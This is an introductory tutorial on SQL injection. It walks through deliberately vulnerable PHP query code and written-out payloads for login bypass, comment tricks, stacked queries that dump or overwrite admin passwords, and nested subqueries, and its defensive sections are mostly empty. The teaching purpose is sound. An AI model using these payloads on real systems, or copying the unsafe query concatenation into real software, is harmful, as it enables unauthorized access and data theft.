# SQL INJECTION - LESSON 0

What is SQL Injection?
SQL Injection (SQLi) is a type of code injection technique, used to attack data-driven applications, that makes it possible to execute malicious SQL statements.

First public discussion about SQL injection appeared in 1998 on [Phrack Magazine](http://phrack.org/issues/54/8.html#article).

SQLi exploits a security vulnerability in application's software, based on weak
or absence of validation of the user inputs.

Using an SQLi allows attackers to spoof identity, tamper existing data, dump,
edit and delete all data, execute administration operation on DBMS and in
particular circumstances allows an attacker to obtain LFI or RCE on a system.

Usually an SQLi attack happens on Web applications but the only requirement
is that an input controlled by the end-user (like a search input form, a login
form, etc.) is used to create a query that will be executed on the DBMS.

## ' OR 1=1

The first basic way to check if an application is vulnerable to SQLi is to try
to break query syntax.

#### Example 0.1
Given this PHP code:
```php

  $sql = "SELECT * FROM pages WHERE id = " . $_GET['id'];
  $result = $conn->query($sql);
  while($row = $result->fetch_array()){
    print_r($row);
  }
```

If we use `$_GET['id'] = 1` we will get the page with id `1` from the DB, but
what happens if we pass `1'` as value?
```
  #1064 - You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''
```

BOOM! We broke the syntax and got an error. But What happened?
Let's see the query that is created :
```
  SELECT * FROM pages WHERE id = 1'
```

The DBMS was expecting an ending quote ' that is not present and produces a
syntax error.

This is useful to understand that what we are injecting in the query was
interpreted as part of the SQL statement and not just as value that `id` should
have.

Therefore we can try to insert more complex SQL statements to see what happens:
Let's try with `$_GET[id] = 1 OR 1=1`, the query produced will be:
```
  SELECT * FROM pages WHERE id = 1 OR 1=1
```

BOOM! The resulting query is legal and we will get all the pages from the DB.

The technique is basically the same if the argument is surrounded by quotes,
we just have to break the string in SQL, inject our code and be careful that the
syntax is legal.

#### Example 0.2
Given this PHP code:

We have just introduced the surrounding single quotes `'` in the SQL
statement (the double quotes `"` are the PHP string delimiters).
```php

  $sql = "SELECT * FROM pages WHERE id = '" . $_GET['id'] . "'";
  $result = $conn->query($sql);
  while($row = $result->fetch_array()){
    print_r($row);
  }
```

Using `$_GET[id] = 1`, the query produced will be:
```
  SELECT * FROM pages WHERE id = '1'
```

If we use `$_GET[id] = 1' OR 1=1`, the query produced will be:
```
  SELECT * FROM pages WHERE id = '1' OR 1=1'
```
and we will get an SQL syntax error (and ending quote is missing).
But we can inject multiple quotes :)

Let's try with `$_GET[id] = 1' OR '1'='1` (please note the missing ending quote).
It will produce:
```
  SELECT * FROM pages WHERE id = '1' OR '1'='1'
```

BOOM! The resulting query is legal and we will get all the pages from the DB.

## LOGIN BYPASS
The technique described in the previous chapter can be useful to bypass login
screens.

#### Example 0.3
Given this PHP code:
```php

  $sql = "SELECT * FROM users
          WHERE username = '" . $_GET['username'] . "'
          AND password = '" . $_GET['password'] . "'";
  $result = mysqli_query($conn, $sql);
  $row_count = mysqli_num_rows($result);
  if ($row_count != 0) {
    echo 'Authorized';
  } else {
    echo 'Not authorized';
  }
```
If we use `$_GET['username'] = admin` and `$_GET['password'] = password` the
resulting query will be:
```
  SELECT * FROM users WHERE username = 'admin' AND password = 'password'
```
The code will check if the resulting number of rows is different from 1, so we
need a way to alter this condition.

We will try to use `$_GET['password'] = password' OR '1'='1` for the user
`admin`.
The query produced will be:
```
  SELECT * FROM users WHERE username = 'admin' AND password = 'password' OR '1' = '1'
```

BOOM! We altered the query adding a condition that is always `true`.
Because of that the resulting number of rows will be greater than `1` and we
can access to the authenticated part of code.


### COMMENTS

Sometimes happens that we can inject code only in the middle of the query,
and this prevents us from append some condition like we did in the previous example.

#### Example 0.4
Given this PHP code:
```php

  $sql = "SELECT * FROM users
          WHERE username = '" . $_GET['username'] . "'
          AND password = '" . md5($_GET['password']) . "'";
  $result = mysqli_query($conn, $sql);
  $row_count = mysqli_num_rows($result);
  if ($row_count != 0) {
    echo 'Authorized';
  } else {
    echo 'Not authorized';
  }
```

This code differs from the example 0.4 by the introduction of the `md5` call:
the password parameter is hashed before gets inserted in the query. It is
obvious that in this way we can't abuse the password parameter because every
bad character that we can insert in this parameter will be transformed in
something else.

If we try to use the solution of the previous example we will get:
`$_GET['password'] = password' OR '1'='1` for the user
`admin`.
The query produced will be:
```
  SELECT * FROM users WHERE username = 'admin' AND password = 'd4f5b5147e1a65e372172e164d30aad9';
```

As you can see we can't bypass this control in this way.
However we have another injectable parameter, `$_GET['username']`.
How can we abuse this parameter bypassing the the `password`?
Here is when database comments come in hand.

Comments in SQL code are similar to comments in any other programming language.
They are used to insert information in the code and they are ignored by the
interpreter.

#### Database comments
Database | Comment | Note
--- | --- | ---
MSSQL / Oracle | `-- (double dash)` | Used for single-line comments
MSSQL / Oracle | `/* */` | Used for multiline comments
MySQL | `-- (double dash)` |  Used for single-line comments. It requires the second dash to be followed by a space or a control character such as tabulation, newline, etc.
MySQL | `#` | Used for single-line comments
MySQL | `/* */` | Used for multiline comments

To reach our goal we need to terminate the SQL statement and comment out the rest
of the query, injecting code only in the username field.
`$_GET['username'] = ' OR 1=1; -- -`

The query produced will be:
```
  SELECT * FROM users WHERE username = '' OR 1=1; -- - AND password = 'd4f5b5147e1a65e372172e164d30aad9';
```
This statement will return all rows in the user table and it will ignore the
password part.
This technique can be useful also to impersonate a known user:
`$_GET['username'] = admin' OR 1=1; -- -`

will produce:
```
  SELECT * FROM users WHERE username = 'admin' OR 1=1; -- - AND password = 'd4f5b5147e1a65e372172e164d30aad9';
```

We can get the same result with another inline comment `#`.
`$_GET['username'] = ' OR 1=1; #`

The query produced will be:
```
  SELECT * FROM users WHERE username = '' OR 1=1; # AND password = 'd4f5b5147e1a65e372172e164d30aad9';
```


Sometimes can happen that double dash (`--`) can't be used because it is
filtered by the application or because it produces query error.
Let's see another example where it is implemented a basic filter to remove
dashes.

#### Example 0.5
Given this PHP code:
```php
  function filterDashes($str) {
    return str_replace('-', '', $str);
  }

  $username = filterDashes($_GET['username']);
  $password = filterDashes($_GET['password']);
  $subdomain = filterDashes($_GET['subdomain']);
  $sql = "SELECT * FROM users
          WHERE username = '" . $username . "'
          AND password = '" . md5($password) . "'
          AND subdomain = '" . $subdomain . "'";
  $result = mysqli_query($conn, $sql);
  $row_count = mysqli_num_rows($result);
  if ($row_count != 0) {
    echo 'Authorized';
  } else {
    echo 'Not authorized';
  }
```
As you can see there is another parameter, also injectable, but all dashes will
be removed from all parameters.

How can we produce a legal statement, removing at the same time the check on
password and maybe also on subdomain?
In this attack we'll use the multiline comment (`/* */`) splitted in different
parameters to bypass the check on password param.

```
$_GET['username'] = 'admin/*
$_GET['password'] = foobar
$_GET['subdomain'] = */ OR '1'='1
```
will produce:
```
  SELECT * FROM users WHERE username = 'admin'/*' AND password = '3858f62230ac3c915f300c664312c63f' AND subdomain = '*/ OR '1'='1';
```
Removing commented code:
```
  SELECT * FROM users WHERE username = 'admin';
```
BOOM!

### STACKED QUERIES
Terminating an SQL statement in an arbitrary way allow us to have a great
control on what the DBMS will execute.
For example in Microsoft SQL Server 6.0 were introduced server-side cursors
that allows to execute a string with multiple statements with the same
connection.
This feature allow to execute a statement as the following:
```
SELECT * FROM users; SELECT * FROM administrators;
```
MySQL introduced the same feature in version 4.1 but it is not enabled by
default. Oracle databases don't support multiple statements.

If we can terminate an SQL statement and execute stacked queries we can do a
lot of (evil) stuff.

#### Example 0.6
Given this PHP code, assuming that is running on MySQL > 4.1 with multiple
statements enabled:
```php

  $sql = "SELECT * FROM pages WHERE id = " . $_GET['id'];
  $result = $conn->query($sql);
  while($row = $result->fetch_array()){
    print_r($row);
  }
```
This code differs from Example 0.2 for the absence of `'` surrounding the `id`
parameter.

We'll exploit this code to execute an arbitrary statement to show all users and
passwords:

```
$_GET['id'] = 1; SELECT username, password FROM users;
```
will produce this statement:
```
SELECT * FROM pages WHERE id = 1; SELECT username, password FROM users;
```
that will show us all users and password in database.

We can also execute and UPDATE statement:
```
$_GET['id'] = 1; UPDATE users SET password='h4ck3r' WHERE username = 'admin';

SELECT * FROM pages WHERE id = 1; UPDATE users SET password='h4ck3r' WHERE username = 'admin';
```
That will update the `admin` record password with `h4ck3r`.
If we can execute stacked queries we can virtually execute any kind of query on
database.


### NESTED QUERIES
A subquery is a SQL query nested inside a larger query. This is useful when
we need data from other tables in the current query.
A basic example of nested query is the following:
```
SELECT * FROM users WHERE role NOT IN (SELECT id FROM administration_roles);
```
This query will execute a first query on `administration_roles` to get a list
of ids and then will execute the second query that will select all users with
a role that is not one of the `administration_roles`.

We are using the result of a query as a parameter for another one.

We can also use this feature in our injections.

#### Example 0.7
Given this PHP code:
```php

  $sql = "SELECT * FROM users
          WHERE username = '" . $_GET['username'] . "'
          AND password = '" . $_GET['password'] . "'";
  $result = mysqli_query($conn, $sql);
  $row_count = mysqli_num_rows($result);
  if ($row_count != 0) {
    echo 'Authorized';
  } else {
    echo 'Not authorized';
  }
```
we can use a nested query on the password parameter to get the password itself
(we also have to insert some comments to have a legal statement):
```
  $_GET['username'] = admin
  $_GET['password'] = '+(SELECT password FROM users WHERE username='admin') -- -;
```
will produce:
```
  SELECT * FROM users WHERE username = 'admin' AND password = ''+(SELECT password from users WHERE username='admin') -- -';
```

### REAL LIFE EXAMPLES

### UNSAFE EXAMPLES

### SAFE EXAMPLES
The magic_quotes( ), addslashes( ), and mysql_real_escape_string( ) filters
cannot completely prevent the presence or exploitation of an SQL injection
vulnerability.

### TOOL
